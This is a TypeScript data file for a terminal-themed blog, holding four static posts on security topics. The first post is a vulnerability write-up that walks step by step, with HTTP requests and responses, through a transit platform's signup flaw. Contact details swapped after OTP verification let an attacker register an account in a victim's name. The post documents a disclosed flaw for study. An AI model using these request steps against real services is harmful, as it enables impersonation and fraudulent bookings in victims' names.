import { BlogPost } from '../types';

// This would normally use dynamic imports in a real project
// For demo purposes, we'll create static blog posts with markdown content
export const getPosts = async (): Promise<BlogPost[]> => {
  // Simulate loading delay
  await new Promise(resolve => setTimeout(resolve, 500));

  return [
    {
      slug: 'redacted-account-creation-logic-flaw',
      title: 'Exploiting Parameter Decoupling: How I registered unauthorized accounts on a transit platform',
      date: '2025-06-02',
      readTime: 15,
      content: `
**The Anatomy of a Silent Account Takeover Vulnerability**

During a routine security assessment of [redacted]'s Connect platform (a public transit service used in multiple cities), I discovered a critical business logic flaw that allowed complete account takeover through unauthorized registration. Unlike typical OTP bypasses, this vulnerability exploited the dangerous decoupling between verification and execution in their signup flow - enabling identity hijacking without any victim notification.

**Vulnerability Root Cause**
The platform employed a **decoupled architecture** where:

(1) OTP verification validated only the initial phone number

(2) Account creation parameters remained mutable post-verification

(3) No server-side binding between verified number and final account details

This created a dangerous window where attackers could substitute victim details after successful verification but before account persistence.

\`\`\`text
Attacker's can abuse this flaw to register unauthorized accounts on the platform and do ride bookings on behalf of the victim.
\`\`\`

**Exploitation Flow**
Here's the step-by-step attack mechanics:

1. **Initial Legitimate Verification**  
   Attacker initiates signup with their real number:
   \`\`\`http
   POST /verify-phone 
   { "phone": "+1<attacker_number>" }
   \`\`\`
   → Completes OTP verification (establishes trusted session)

2. **Parameter Tampering Window**  
   On account detail screen, attacker enables proxy interception and modifies:
   \`\`\`diff
   POST /account/rider/check_availability
   {
     "contact": {
   -   "email": "attacker@mail.com",
   -   "phone": "+1<attacker_number>"
   +   "email": "victim@mail.com",
   +   "phone": "+1<victim_number>"
     }
   }
   \`\`\`

3. **Server Misvalidation**  
   Backend responded with false validation:
   \`\`\`json
   {
     "valid_contact_data": {
       "phone": "+1<victim_number>",
       "email": "victim@mail.com"
     },
     "should_verify_phone": false // Critical flaw!
   }
   \`\`\`

4. **Account Creation Exploit**  
   Final creation request with victim details:
   \`\`\`http
   POST /account/rider/create
   {
     "rider_info": {
       "name": {"first_name":"Attacker","last_name":"Name"},
       "contact": {
         "email": "victim@mail.com",
         "phone": "+1<victim_number>"
       }
     }
   }
   \`\`\`

5. **Silent Account Hijack**  
   Server response included full authentication token:
   \`\`\`json
   {
     "rider_identity": {
       "auth_token": "2|1:0|10:1747941030|4:user|...",
       "id": 13232
     },
     "rider_account": {
       "contact": {
         "email": "victim@mail.com",
         "phone": "+1<victim_number>"
       }
     }
   }
   \`\`\`

**Critical Observations**:

(1) No re-verification triggered for changed contact details

(2) Session remained valid despite parameter tampering

(3) Victim never received OTP or creation notification

(4) Attacker gained immediate account access

**Conclusion**

This vulnerability demonstrated how even perfect cryptographic verification (OTP) becomes meaningless when business logic fails to maintain the verification context. Security engineers must remember: **Verification without binding is just theater**.

The most dangerous vulnerabilities often live in the gaps between systems - where assumptions about data consistency meet the reality of attacker manipulation. Always validate the journey, not just the starting point.`
    },
    {
      slug: 'secure-coding-practices',
      title: 'Essential Secure Coding Practices',
      date: '2023-09-15',
      readTime: 5,
      content: `
**Essential Secure Coding Practices**

Security should be built into the development process from the start, not added as an afterthought. Here are some essential practices every developer should follow.

**1. Input Validation**

Never trust user input. Validate all input against a whitelist of allowed characters and formats.

\`\`\`javascript
if (command.startsWith("inject")) {
  setOutput([
    \`guest@akshayblog:~$ \${command}\`,
    "[!] Suspicious query detected:",
    \`> SELECT * FROM users WHERE username = '\${injectedValue}'\`,
    "🛡️  Injection blocked: parameterized queries in use."
  ]);
}
\`\`\`

**2. Parameterized Queries**

Always use parameterized queries or prepared statements to prevent SQL injection.

**3. Output Encoding**

Encode output data based on the context where it will be displayed to prevent XSS attacks.

**4. Authentication & Authorization**

Implement strong authentication and proper authorization checks for all sensitive operations.

**5. HTTPS Everywhere**

Use HTTPS for all connections to protect data in transit.

Remember, security is a continuous process, not a one-time task!
      `
    },
    {
      slug: 'understanding-zero-trust',
      title: 'Understanding Zero Trust Architecture',
      date: '2023-10-22',
      readTime: 7,
      content: `
**Understanding Zero Trust Architecture**

**The End of "Trust but Verify"**

Traditional security models operated on a "trust but verify" principle. Zero Trust flips this concept on its head with a "never trust, always verify" approach.

**Core Principles**

1. **Verify explicitly** - Always authenticate and authorize based on all available data points  
2. **Use least privilege access** - Limit user access with Just-In-Time and Just-Enough-Access  
3. **Assume breach** - Minimize blast radius and segment access

**Implementation Strategies**

**1. Identity as the New Perimeter**

\`\`\`
┌────────────────┐     ┌───────────────┐     ┌────────────┐
│                │     │               │     │            │
│  User Identity ├────►│ Policy Engine ├────►│ Resources  │
│                │     │               │     │            │
└────────────────┘     └───────────────┘     └────────────┘
\`\`\`

**2. Micro-Segmentation**

Divide security perimeters into small zones to maintain separate access for separate parts of the network.

**3. Continuous Monitoring and Validation**

Zero Trust is not a "set it and forget it" approach. Continuous monitoring is essential.

**Challenges**

- Legacy system integration  
- Initial complexity  
- Cultural resistance  

Remember: Zero Trust is a journey, not a destination!
      `
    },
    {
      slug: 'first-post',
      title: 'Welcome to My Hacker Terminal Blog',
      date: '2023-08-01',
      readTime: 3,
      content: `
**Welcome to My Hacker Terminal Blog**

Hello, world! This is the first post on my new terminal-themed blog. I'll be sharing thoughts on cybersecurity, programming, and technology.

**Why a Terminal Theme?**

There's something nostalgic yet timeless about the command line interface. It represents:

- **Simplicity**: Focus on content, not flashy design  
- **Power**: The terminal is where real work happens  
- **History**: Honoring computing's roots

**What to Expect**

- Technical deep dives  
- Security analysis  
- Coding tutorials  
- Random thoughts on tech

Stay tuned for more posts coming soon!

\`\`\`
$ echo "Thanks for reading!"
Thanks for reading!
\`\`\`
      `
    }
  ];
};
